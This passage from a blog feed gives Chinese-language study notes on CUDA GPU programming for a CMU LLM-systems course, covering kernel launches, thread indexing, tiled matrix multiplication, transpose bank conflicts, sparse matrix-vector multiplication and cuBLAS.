数据传输相对昂贵，性能关键的应用程序旨在最小化此类传输并最大化GPU 上的数据重用。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125230847834.png" alt="image-20260125230847834" style="zoom: 40%;" /></p><p>在每个流式多处理器（SM）上，指令通过每个周期有限数量的<strong>发射槽</strong> 发给执行单元。发射槽表示在给定周期从 warp发出指令的硬件能力，因此直接限制了 SM 上的指令吞吐量。</p><p>在预 Hopper 架构（例如，A100）中，等待内存操作的 warp——例如<strong><u>异步复制到共享内存</u></strong>——仍然参与调度。即使一个 warp在障碍上停滞，它也会反复检查准备情况，占用发射槽并降低整体 SM利用率。</p><p>Hopper 在这个执行模型中引入了一个关键变化。通过<strong><u>张量内存加速器（TMA）</u></strong>，内存传输被卸载到专用硬件单元，等待复制完成的warp 被置于 <strong>睡眠状态</strong>。<strong><u>睡眠中的 warp从调度器的活动集中移除，不再消耗发射槽</u></strong>。因此，发射槽专门用于准备好执行计算的warp，从而实现更高的指令吞吐量和更有效的内存移动与计算之间的重叠。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125232105257.png" alt="image-20260125232105257" style="zoom: 40%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260125232132936.png" alt="image-20260125232132936" style="zoom:50%;" /></p><h3 id="主机设备函数的声明">主机/设备函数的声明</h3><table><thead><tr class="header"><th>关键字</th><th>调用在</th><th>执行在</th><th>用途</th></tr></thead><tbody><tr class="odd"><td><code>__global__</code></td><td>主机（CPU）</td><td>设备（GPU）</td><td><strong>GPU 内核</strong></td></tr><tr class="even"><td><code>__device__</code></td><td>设备</td><td>设备</td><td>GPU 函数</td></tr><tr class="odd"><td><code>__host__</code></td><td>主机</td><td>主机</td><td>普通 CPU 函数</td></tr></tbody></table><p>CUDA 使用显式限定符区分主机和设备函数。<code>__global__</code>函数定义一个 GPU 内核，从 CPU 启动，但由 GPU上的许多线程并行执行。每个线程运行相同的内核代码，并使用其线程和块索引来确定处理的数据部分。</p><h3 id="运行时调用内核">运行时调用内核</h3><p>在 CUDA 中，内核的并行执行配置由 <strong>主机（CPU）</strong>在运行时指定，而不是在编译时固定。当启动内核时，主机显式定义<strong>网格-块-线程层次结构</strong>，这决定了将有多少 GPU线程执行该内核。</p><p>内核使用特殊语法启动：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernelFunc&lt;&lt;&lt;Dg, Db&gt;&gt;&gt;(args);</span><br></pre></td></tr></table></figure><p>在这里，<code>Dg</code>（网格维度）和<code>Db</code>（块维度）可以指定为整数或 <code>dim3</code> 对象：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">dim3 <span class="title">Dg</span><span class="params">(<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="function">dim3 <span class="title">Db</span><span class="params">(<span class="number">8</span>, <span class="number">8</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">kernelFunc&lt;&lt;&lt;Dg, Db&gt;&gt;&gt;(args);</span><br></pre></td></tr></table></figure><ul><li><code>Dg</code> 定义<strong>网格的大小</strong>，即线程块的数量。</li><li><code>Db</code> 定义<strong>每个块的大小</strong>，即每个块的线程数量。</li></ul><p>块的总数为 <code>Dg.x * Dg.y * Dg.z</code>，每个块的线程总数为<code>Db.x * Db.y * Db.z</code>，在当前 NVIDIA GPU 上不得超过 1024。</p><h3 id="设备运行时变量">设备运行时变量</h3><p>一旦内核被启动，每个在 GPU 上执行的线程必须能够识别<strong>它属于哪个块以及它在该块内的线程编号</strong>。CUDA提供了一组内置的设备侧变量来实现这一点，这些变量由编译器自动生成。</p><p>这些变量包括：</p><ul><li><code>gridDim</code> (<code>dim3</code>): 网格的维度</li><li><code>blockIdx</code> (<code>uint3</code>):当前块在网格中的索引</li><li><code>blockDim</code> (<code>dim3</code>): 块的维度</li><li><code>threadIdx</code> (<code>uint3</code>):当前线程在块内的索引</li></ul><p>所有内核线程执行相同的代码，但通过使用这些变量，每个线程可以计算出一个唯一的全局索引。一个常见的模式是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int i = blockIdx.x * blockDim.x + threadIdx.x;</span><br></pre></td></tr></table></figure><p>这使得线程能够自然地映射到存储在全局内存中的数组或其他数据结构的元素。</p><h3 id="从-cpu-调用-cuda-内核">从 CPU 调用 CUDA 内核</h3><p>在实践中，主机通常根据输入问题的大小计算网格和块的大小。例如，在处理长度为<code>n</code>的向量时，常见的方法是选择固定数量的线程每个块，并使用向上取整的整数除法计算所需的块数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n = <span class="number">1024</span>;</span><br><span class="line"><span class="type">int</span> threads_per_block = <span class="number">256</span>;</span><br><span class="line"><span class="type">int</span> num_blocks = (n + threads_per_block - <span class="number">1</span>) / threads_per_block;</span><br><span class="line"></span><br><span class="line">VecAddKernel&lt;&lt;&lt;num_blocks, threads_per_block&gt;&gt;&gt;(dA, dB, dC, n);</span><br></pre></td></tr></table></figure><p>当这个启动发生时：</p><ol type="1"><li>CPU 使用指定的网格和块配置发出内核启动。</li><li>GPU 创建块的网格并将其调度到可用的流式多处理器（SMs）上。</li><li>每个块进一步划分为 warp，线程并行执行内核代码。</li><li>每个线程使用 <code>blockIdx</code>、<code>blockDim</code> 和<code>threadIdx</code> 确定其操作的数据元素。</li></ol><h1 id="gpu-加速">GPU 加速</h1><h2 id="内存访问效率">内存访问效率</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126001922475.png" alt="image-20260126001922475" style="zoom:50%;" /></p><h2 id="cuda-设备内存模型">CUDA 设备内存模型</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126002047948.png" alt="image-20260126002047948" style="zoom: 33%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126003051375.png" alt="image-20260126003051375" style="zoom: 33%;" /></p><h2 id="矩阵乘法的平铺">矩阵乘法的平铺</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126131507652.png" alt="image-20260126131507652" style="zoom:50%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126131528542.png" alt="image-20260126131528542" style="zoom:50%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126131541664.png" alt="image-20260126131541664" style="zoom:50%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126131553021.png" alt="image-20260126131553021" style="zoom:50%;" /></p><p>在 CUDA C++ 中的实现：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">MatrixMultiplyKernel</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">float</span> *out,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">int</span> *out_shape,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">int</span> *out_strides,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">float</span> *a_storage,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">int</span> *a_shape,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">int</span> *a_strides,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">float</span> *b_storage,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">int</span> *b_shape,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> <span class="type">int</span> *b_strides)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 将两个（紧凑）矩阵相乘到输出（也为紧凑）矩阵中。矩阵 a 和 b 都是批处理格式，</span></span><br><span class="line"><span class="comment">   * 形状为 [batch_size, m, n], [batch_size, n, p]。</span></span><br><span class="line"><span class="comment">   * 要求：</span></span><br><span class="line"><span class="comment">   * - 所有数据必须首先移动到共享内存。</span></span><br><span class="line"><span class="comment">   * - 只读取 a 和 b 中的每个单元一次。</span></span><br><span class="line"><span class="comment">   * - 每个内核只写入全局内存一次。</span></span><br><span class="line"><span class="comment">   * 保证 a_shape[0] == b_shape[0], a_shape[2] == b_shape[1],</span></span><br><span class="line"><span class="comment">   * 和 out_shape[0] == a_shape[0], out_shape[1] == a_shape[1], out_shape[2] == b_shape[2]。</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * 参数：</span></span><br><span class="line"><span class="comment">   *   out: 紧凑的 1D 数组，大小为 batch_size x m x p，用于写入输出</span></span><br><span class="line"><span class="comment">   *   out_shape: 输出数组的形状</span></span><br><span class="line"><span class="comment">   *   out_strides: 输出数组的步幅</span></span><br><span class="line"><span class="comment">   *   a_storage: 紧凑的 1D 数组，大小为 batch_size x m x n</span></span><br><span class="line"><span class="comment">   *   a_shape: a 数组的形状</span></span><br><span class="line"><span class="comment">   *   a_strides: a 数组的步幅</span></span><br><span class="line"><span class="comment">   *   b_storage: 紧凑的 2D 数组，大小为 batch_size x n x p</span></span><br><span class="line"><span class="comment">   *   b_shape: b 数组的形状</span></span><br><span class="line"><span class="comment">   *   b_strides: b 数组的步幅</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * 返回：</span></span><br><span class="line"><span class="comment">   *   None (填充输出数组)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  __shared__ <span class="type">float</span> a_shared[TILE][TILE];</span><br><span class="line">  __shared__ <span class="type">float</span> b_shared[TILE][TILE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在每个块中，我们将计算输出矩阵的一批</span></span><br><span class="line">  <span class="comment">// 块中的所有线程将共同计算这一批</span></span><br><span class="line">  <span class="type">int</span> batch = blockIdx.z;</span><br><span class="line">  <span class="type">int</span> a_batch_stride = a_shape[<span class="number">0</span>] &gt; <span class="number">1</span> ? a_strides[<span class="number">0</span>] : <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> b_batch_stride = b_shape[<span class="number">0</span>] &gt; <span class="number">1</span> ? b_strides[<span class="number">0</span>] : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// BEGIN HW1_4</span></span><br><span class="line">  <span class="comment">/// TODO</span></span><br><span class="line">  <span class="comment">// 提示：</span></span><br><span class="line">  <span class="comment">// 1. 计算此块将计算的输出矩阵的行和列</span></span><br><span class="line">  <span class="type">int</span> row = blockIdx.y * TILE + threadIdx.y;</span><br><span class="line">  <span class="type">int</span> col = blockIdx.x * TILE + threadIdx.x;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取矩阵维度：A[batch, m, n] × B[batch, n, p] = C[batch, m, p]</span></span><br><span class="line">  <span class="type">int</span> m = a_shape[<span class="number">1</span>];</span><br><span class="line">  <span class="type">int</span> n = a_shape[<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> p = b_shape[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2. 计算此线程将写入的输出数组中的位置</span></span><br><span class="line">  <span class="comment">// （移动到步骤 7 进行边界检查）</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 点积的累加器</span></span><br><span class="line">  <span class="type">float</span> sum = <span class="number">0.0f</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3. 遍历两个输入矩阵的平铺，将数据读取到共享内存中</span></span><br><span class="line">  <span class="type">int</span> num_tiles = (n + TILE - <span class="number">1</span>) / TILE;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; num_tiles; t++) &#123;</span><br><span class="line">    <span class="comment">// 加载 A 瓦片：A[row, t*TILE + threadIdx.x]</span></span><br><span class="line">    <span class="type">int</span> a_col = t * TILE + threadIdx.x;</span><br><span class="line">    <span class="keyword">if</span> (row &lt; m &amp;&amp; a_col &lt; n) &#123;</span><br><span class="line">      a_shared[threadIdx.y][threadIdx.x] = a_storage[batch * a_batch_stride + row * a_strides[<span class="number">1</span>] + a_col * a_strides[<span class="number">2</span>]];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a_shared[threadIdx.y][threadIdx.x] = <span class="number">0.0f</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载 B 瓦片：B[t*TILE + threadIdx.y, col]</span></span><br><span class="line">    <span class="type">int</span> b_row = t * TILE + threadIdx.y;</span><br><span class="line">    <span class="keyword">if</span> (b_row &lt; n &amp;&amp; col &lt; p) &#123;</span><br><span class="line">      b_shared[threadIdx.y][threadIdx.x] = b_storage[batch * b_batch_stride + b_row * b_strides[<span class="number">1</span>] + col * b_strides[<span class="number">2</span>]];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      b_shared[threadIdx.y][threadIdx.x] = <span class="number">0.0f</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 同步以确保所有线程都可以访问数据</span></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 计算此线程块的输出瓦片</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; TILE; k++) &#123;</span><br><span class="line">      sum += a_shared[threadIdx.y][k] * b_shared[k][threadIdx.x];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 同步以确保所有线程完成对（row, col）的输出瓦片计算</span></span><br><span class="line">    __syncthreads();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 7. 将输出写入全局内存</span></span><br><span class="line">  <span class="keyword">if</span> (row &lt; m &amp;&amp; col &lt; p) &#123;</span><br><span class="line">    <span class="type">int</span> out_pos = batch * out_strides[<span class="number">0</span>] + row * out_strides[<span class="number">1</span>] + col * out_strides[<span class="number">2</span>];</span><br><span class="line">    out[out_pos] = sum;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/// END HW1_4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gpu-上的矩阵转置合并共享内存和银行冲突">GPU上的矩阵转置：合并、共享内存和银行冲突</h2><h3 id="合并转置内核">合并转置内核</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">smem_cuda_transpose</span><span class="params">(<span class="type">int</span> m, <span class="type">float</span>* a, <span class="type">float</span>* c)</span> </span>&#123;</span><br><span class="line">    __shared__ <span class="type">float</span> smem[BLOCK_X][BLOCK_Y];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> tileCol = blockDim.x * blockIdx.x;</span><br><span class="line">    <span class="type">int</span> tileRow = blockDim.y * blockIdx.y;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从全局内存加载 → 共享内存</span></span><br><span class="line">    smem[threadIdx.x][threadIdx.y] =</span><br><span class="line">        a[(tileRow + threadIdx.y) * m + (tileCol + threadIdx.x)];</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从共享内存存储 → 全局内存</span></span><br><span class="line">    c[(tileCol + threadIdx.y) * m + (tileRow + threadIdx.x)] =</span><br><span class="line">        smem[threadIdx.y][threadIdx.x];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这解决了什么</p><p>✅ 全局内存读取被合并 ✅ 全局内存写入被合并</p><p>但是…</p><p>❌ <strong>共享内存银行冲突出现</strong></p><h3 id="共享内存银行真正的瓶颈">共享内存银行：真正的瓶颈</h3><ul><li>共享内存被划分为 <strong>32 个银行</strong></li><li>每个银行每个周期提供 <strong>一个 32 位字</strong></li><li>一个 warp 只能在 <strong>1 个周期</strong> 访问共享内存，前提是：<ul><li>每个线程访问 <strong>不同的银行</strong></li></ul></li></ul><p><code>smem[threadIdx.x][threadIdx.y]</code>这段代码实际上会导致银行冲突。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126142048710.png" alt="image-20260126142048710" style="zoom: 40%;" /></p><h3 id="修复填充共享内存">修复：填充共享内存</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">smem_cuda_transpose</span><span class="params">(<span class="type">int</span> m, <span class="type">float</span>* a, <span class="type">float</span>* c)</span> </span>&#123;</span><br><span class="line">    __shared__ <span class="type">float</span> smem[BLOCK_X][BLOCK_Y + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> tileCol = blockDim.x * blockIdx.x;</span><br><span class="line">    <span class="type">int</span> tileRow = blockDim.y * blockIdx.y;</span><br><span class="line"></span><br><span class="line">    smem[threadIdx.x][threadIdx.y] =</span><br><span class="line">        a[(tileRow + threadIdx.y) * m + (tileCol + threadIdx.x)];</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    c[(tileCol + threadIdx.y) * m + (tileRow + threadIdx.x)] =</span><br><span class="line">        smem[threadIdx.y][threadIdx.x];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126142323660.png" alt="image-20260126142323660" style="zoom:40%;" /></p><h2 id="稀疏矩阵乘法">稀疏矩阵乘法</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260126150918193.png" alt="image-20260126150918193" style="zoom:80%;" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">SpMVCSRKernel</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">float</span>* data,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span>*   col_index,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span>*   row_ptr,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">float</span>* x,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">float</span>* y,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span>    num_rows</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> row = blockIdx.x * blockDim.x + threadIdx.x;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (row &lt; num_rows) &#123;</span><br><span class="line">        <span class="type">float</span> dot = <span class="number">0.0f</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> row_start = row_ptr[row];</span><br><span class="line">        <span class="type">int</span> row_end   = row_ptr[row + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> elem = row_start; elem &lt; row_end; ++elem) &#123;</span><br><span class="line">            dot += x[col_index[elem]] * data[elem];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        y[row] += dot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cublas">cuBLAS</h2><p><strong>cuBLAS</strong> 代表 <strong>CUDA基本线性代数子程序</strong>。</p><p>它是 NVIDIA 高度优化的 GPU 实现经典 <strong>BLAS</strong>接口，针对以下操作：</p><ul><li>向量操作（第 1 级 BLAS）</li><li>矩阵-向量操作（第 2 级 BLAS）</li><li>矩阵-矩阵操作（第 3 级 BLAS，特别是 GEMM）</li></ul><h3 id="编程模型">编程模型</h3><p>cuBLAS 使用 <strong>基于句柄的 API</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cublasHandle_t handle;</span><br><span class="line"><span class="built_in">cublasCreate</span>(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="comment">// cuBLAS 调用</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cublasDestroy</span>(handle);</span><br></pre></td></tr></table></figure><p>所有 cuBLAS 操作都需要一个有效的<code>cublasHandle_t</code>，它存储执行上下文，例如 CUDA流和数学模式。</p><h3 id="第-1-级-blas向量点积">第 1 级 BLAS：向量点积</h3><p>计算两个向量的点积： <span class="math display">\[\text{result} = x^T y\]</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cublasStatus_t cublasSdot(</span><br><span class="line">    cublasHandle_t handle,</span><br><span class="line">    int n,</span><br><span class="line">    const float* x, int incx,</span><br><span class="line">    const float* y, int incy,</span><br><span class="line">    float* result</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>关键点：</strong></p><ul><li><code>n</code> 是元素的数量</li><li><code>incx</code>、<code>incy</code> 指定元素之间的步幅</li><li><code>x</code> 和 <code>y</code> 必须位于 <strong>设备内存</strong>中</li><li><code>result</code> 写入 <strong>主机内存</strong></li></ul><p>这是范数、投影和归约的基本构建块。</p><hr /><h3 id="第-2-级-blas矩阵-向量乘法">第 2 级 BLAS：矩阵-向量乘法</h3><p>计算： <span class="math display">\[y = \alpha A x + \beta y\]</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cublasStatus_t cublasSgemv(</span><br><span class="line">    cublasHandle_t handle,</span><br><span class="line">    cublasOperation_t trans,</span><br><span class="line">    int m, int n,</span><br><span class="line">    const float* alpha,</span><br><span class="line">    const float* A, int lda,</span><br><span class="line">    const float* x, int incx,</span><br><span class="line">    const float* beta,</span><br><span class="line">    float* y, int incy</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>关键点：</strong></p><ul><li><code>A</code> 是一个 <span class="math inline">\(m \timesn\)</span> 矩阵，以 <strong>列优先</strong> 顺序存储</li><li><code>trans</code> 控制 <code>A</code> 是否转置</li><li><code>lda</code> 是 <code>A</code> 的主维度</li><li>所有向量和矩阵都在 <strong>设备内存</strong> 中</li></ul><p>此操作在迭代求解器和神经网络层中很常见。</p><hr /><h3 id="第-3-级-blas矩阵-矩阵乘法gemm">第 3 级BLAS：矩阵-矩阵乘法（GEMM）</h3><p>计算： <span class="math display">\[C = \alpha A B + \beta C\]</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cublasStatus_t cublasSgemm(</span><br><span class="line">    cublasHandle_t handle,</span><br><span class="line">    cublasOperation_t transA,</span><br><span class="line">    cublasOperation_t transB,</span><br><span class="line">    int m, int n, int k,</span><br><span class="line">    const float* alpha,</span><br><span class="line">    const float* A, int lda,</span><br><span class="line">    const float* B, int ldb,</span><br><span class="line">    const float* beta,</span><br><span class="line">    float* C, int ldc</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>关键点：</strong></p><ul><li>这是 <strong>最重要的 cuBLAS API</strong></li><li><code>A</code>、<code>B</code>、<code>C</code> 都以<strong>列优先</strong> 布局存储</li><li><code>m</code>、<code>n</code>、<code>k</code> 定义矩阵形状</li><li>内部使用 <strong>平铺、共享内存和张量核心（如果可用）</strong></li></ul><p>GEMM 是深度学习和科学计算的性能支柱。</p>]]></content>
      
      
      <categories>
          
          <category> CMU 11-868 大语言模型系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> LLM Systems </tag>
            
            <tag> GPU Programming </tag>
            
            <tag> 11868 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11711 Advanced NLP: Fundamentals</title>
      <link href="/zh/2026/01/23/11711-Advanced-NLP/11711-Advanced-NLP-Fundamentals/"/>
      <url>/zh/2026/01/23/11711-Advanced-NLP/11711-Advanced-NLP-Fundamentals/</url>
      
